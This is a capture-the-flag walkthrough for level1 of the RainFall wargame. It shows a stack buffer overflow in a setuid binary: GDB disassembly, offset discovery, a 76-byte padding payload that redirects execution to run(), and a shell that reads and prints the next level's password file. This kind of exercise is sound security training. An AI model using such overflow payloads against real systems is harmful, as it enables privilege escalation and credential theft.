# Level1 Exploit

## Steps

### 1. Initial Analysis

List the files in the directory:

```bash
level1@RainFall:~$ ls -l
total 8
-rwsr-s---+ 1 level2 users 5138 Mar  6  2016 level1
```

### 2. Program Execution

Observe the program behavior with different inputs:

```bash
level1@RainFall:~$ ./level1
olé
level1@RainFall:~$ ./level1 test
423
```

### 3. Disassembling `main` and `run` Functions

Use GDB to disassemble the `main` and `run` functions:

```bash
level1@RainFall:~$ gdb level1
(gdb) disassemble main
(gdb) disassemble run
```

You can convert the assembly code to C using the [CodeConvert](https://www.codeconvert.ai/assembly-to-c++-converter) tool for better understanding.

Identify the address of the run function: 0x08048444.

### 4. Finding the Offset

Generate a unique pattern to identify the offset using the [Wiremask pattern generator](https://wiremask.eu/tools/buffer-overflow-pattern-generator/):

Run the program with GDB:

```bash
(gdb) r
Starting program: /home/user/level1/level1 
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag

Program received signal SIGSEGV, Segmentation fault.
0x63413563 in ?? ()
(gdb) 

```

Use the [Wiremask offset calculator](https://wiremask.eu/tools/buffer-overflow-pattern-offset/) to find the offset for `0x63413563`. It correspond to an offset of 76.

### 5. Creating the Exploit

Create an exploit file with the correct padding and the address of `run`:

```bash
level1@RainFall:~$ python -c 'print("A" * 76 + "\x44\x84\x04\x08")' > /tmp/exploit
```

### 6. Executing the Exploit

Use `cat -` to keep stdin open:

```bash
level1@RainFall:~$ cat /tmp/exploit - | ./level1
Good... Wait what?
whoami
level2
cat /home/user/level2/.pass
53a4a712787f40ec66c3c26c1f4b164dcad5552b038bb0addd69bf5bf6fa8e77
```

### Explanation

1. **Disassembling Functions**: Use GDB to disassemble the `main` and `run` functions to understand the program flow.
2. **Pattern Generator**: Used to generate a unique and identifiable pattern to find the exact offset where the overflow occurs.
3. **Offset**: Identified as 76, meaning 76 characters fill the buffer up to the EIP.
4. **Payload**: Consists of 76 'A's followed by the address of `run` in little-endian format (`\x44\x84\x04\x08`).
5. **Cat - |**: Keeps stdin open, allowing the launched shell to remain interactive.